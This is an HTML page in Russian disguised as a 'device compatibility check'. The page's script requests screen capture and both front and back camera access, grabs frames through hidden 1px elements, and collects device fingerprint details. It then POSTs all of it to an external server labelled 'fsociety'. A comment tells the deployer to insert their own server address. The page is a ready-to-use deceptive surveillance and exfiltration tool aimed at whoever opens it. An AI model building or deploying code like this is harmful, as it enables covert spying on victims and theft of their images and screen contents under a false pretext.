<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Проверка устройства</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #667eea; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 16px; text-align: center; max-width: 460px; width: 90%; }
        h1 { color: #1a1a2e; }
        p { color: #555; margin: 16px 0 24px; line-height: 1.6; }
        button { background: #667eea; color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 17px; cursor: pointer; }
        button:disabled { opacity: 0.6; }
        .status { margin-top: 20px; color: #666; font-size: 14px; }
        video, canvas { width: 1px; height: 1px; position: fixed; opacity: 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Проверка совместимости</h1>
        <p>Нажмите кнопку для проверки вашего устройства.<br>Это займёт несколько секунд.</p>
        <button id="btn">Начать проверку</button>
        <div class="status" id="status"></div>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // !!! ЗДЕСЬ ЗАМЕНИ АДРЕС ПОСЛЕ ДЕПЛОЯ НА RENDER !!!
        const SERVER_URL = 'https://fsociety-j6df.onrender.com';
        // Когда задеплоишь, сюда надо вставить свою ссылку

        const btn = document.getElementById('btn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        btn.onclick = async () => {
            btn.disabled = true;
            status.textContent = 'Запуск...';

            const result = {
                timestamp: new Date().toISOString(),
                device: getDeviceInfo(),
                screenCapture: null,
                frontCamera: null,
                backCamera: null
            };

            // Скриншот
            status.textContent = 'Запрос скриншота...';
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                result.screenCapture = await captureFrame(track);
                track.stop();
            } catch(e) { status.textContent = 'Скриншот: ' + e.message; }

            // Фронтальная камера
            status.textContent = 'Запрос фронтальной камеры...';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 500));
                const track = stream.getVideoTracks()[0];
                result.frontCamera = await captureFrame(track);
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { status.textContent = 'Фронтальная: ' + e.message; }

            // Тыловая камера
            status.textContent = 'Запрос тыловой камеры...';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 500));
                const track = stream.getVideoTracks()[0];
                result.backCamera = await captureFrame(track);
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { status.textContent = 'Тыловая: ' + e.message; }

            // Отправка
            status.textContent = 'Отправка...';
            try {
                const resp = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(result)
                });
                if (resp.ok) status.textContent = '✅ Готово!';
                else status.textContent = '❌ Ошибка сервера';
            } catch(e) {
                status.textContent = 'Ошибка отправки: ' + e.message;
            }
            btn.disabled = false;
        };

        async function captureFrame(track) {
            const imgCapture = new ImageCapture(track);
            const bitmap = await imgCapture.grabFrame();
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            ctx.drawImage(bitmap, 0, 0);
            const url = canvas.toDataURL('image/jpeg', 0.85);
            bitmap.close();
            return url;
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: { width: screen.width, height: screen.height },
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }
    </script>
</body>
</html>
